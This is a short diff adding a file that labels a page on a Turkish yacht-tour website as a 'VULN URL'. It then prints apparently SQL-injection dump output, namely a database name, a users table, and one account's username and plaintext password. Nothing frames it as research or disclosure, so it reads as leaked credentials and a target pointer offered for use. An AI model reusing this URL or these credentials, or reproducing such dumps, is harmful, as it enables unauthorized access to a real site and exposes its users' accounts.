@@ -1,0 +1,10 @@
+VULN URL : https://www.mavidenizyat.com.tr/antalya-kemer-yat-turu.php?id=5
+
+Database: lifekeme_mavideniz
+Table: users
+[1 entry]
++----+-------------+----------+----------+---------------------+
+| id | password    | username | email    | trn_date            |
++----+-------------+----------+----------+---------------------+
+| 24 | !BlueSea07! | kara.077 | kara.077 | 2023-07-02 02:07:42 |
++----+-------------+----------+----------+---------------------+
